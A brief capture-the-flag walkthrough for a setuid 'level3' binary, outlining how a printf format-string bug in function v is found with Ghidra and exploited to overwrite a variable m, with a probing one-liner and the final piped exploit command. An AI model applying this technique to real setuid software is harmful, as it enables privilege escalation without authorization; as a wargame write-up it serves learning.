level3 walkthrough
==================

1. 
$ ls -l
-rwsr-s---+ 1 level4 users 5403 Mar  6  2016 level3


2.
$ ./level3
//waiting for input

3. ghidra usage 

find that can change a m value using printf in v function

4. write a script to change the m value

so I write a buff which contain  <m_address> + A * 60 + <position_of_m>

and save it in /tmp/exploit3

//(echo -e "\x8c\x98\x04\x08.%4\$x") | ./level3  can help find position of m

6. 
$ (cat /tmp/exploit3; cat) | ./level3
ï¿½AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
